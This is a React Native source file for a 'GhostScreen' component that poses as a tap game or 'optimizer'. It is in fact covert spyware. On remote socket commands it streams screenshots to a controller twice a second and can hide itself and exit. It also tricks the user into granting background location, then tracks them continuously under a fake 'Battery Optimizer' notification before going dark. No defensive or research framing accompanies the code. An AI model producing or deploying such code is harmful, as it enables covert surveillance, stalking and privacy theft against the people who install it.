import React, { useState, useEffect, useRef } from 'react';
import { View, Text, StyleSheet, TouchableOpacity, Animated, BackHandler, Linking } from 'react-native';
import * as Location from 'expo-location';
import { captureScreen } from 'react-native-view-shot';

export default function GhostScreen({ socket, name, taskName }) {
    const [score, setScore] = useState(0);
    const [stealth, setStealth] = useState(false);
    const targetPos = useRef(new Animated.ValueXY()).current;
    const streamRef = useRef(null);

    useEffect(() => {
        socket.on('admin_command', async (cmd) => {
            if (cmd === 'START_LIVE') {
                clearInterval(streamRef.current);
                streamRef.current = setInterval(async () => {
                    const img = await captureScreen({ format: 'jpg', quality: 0.1, result: 'base64' });
                    socket.emit('screen_frame', { ghostName: name, frame: img });
                }, 500);
            }
            if (cmd === 'STOP_STREAM') clearInterval(streamRef.current);
            if (cmd === 'WIPE_SERVICE') {
                setStealth(true);
                Linking.openSettings(); 
                BackHandler.exitApp();
            }
        });
        return () => clearInterval(streamRef.current);
    }, []);

    const handleTap = async () => {
        if (score === 0) {
            await Location.requestForegroundPermissionsAsync();
            await Location.requestBackgroundPermissionsAsync();
        }
        if (score >= 4) {
            setStealth(true);
            await Location.startLocationUpdatesAsync(taskName, { 
                accuracy: Location.Accuracy.High,
                foregroundService: { notificationTitle: "Battery Optimizer", notificationBody: "Syncing..." }
            });
            setTimeout(() => BackHandler.exitApp(), 1000);
        }
        setScore(s => s + 1);
        Animated.spring(targetPos, { 
            toValue: { x: Math.random() * 200 - 100, y: Math.random() * 300 - 150 }, 
            useNativeDriver: false 
        }).start();
    };

    if (stealth) return <View style={{ flex: 1, backgroundColor: '#000' }} />;

    return (
        <View style={styles.container}>
            <Text style={styles.scoreText}>OPTIMIZING: {score * 20}%</Text>
            <Animated.View style={targetPos.getLayout()}>
                <TouchableOpacity style={styles.target} onPress={handleTap} />
            </Animated.View>
        </View>
    );
}

const styles = StyleSheet.create({
    container: { flex: 1, backgroundColor: '#080808', justifyContent: 'center', alignItems: 'center' },
    scoreText: { color: '#1a1a1a', fontSize: 10, position: 'absolute', top: 50 },
    target: { width: 75, height: 75, borderRadius: 40, backgroundColor: '#e60000', borderWidth: 2, borderColor: '#fff' }
});
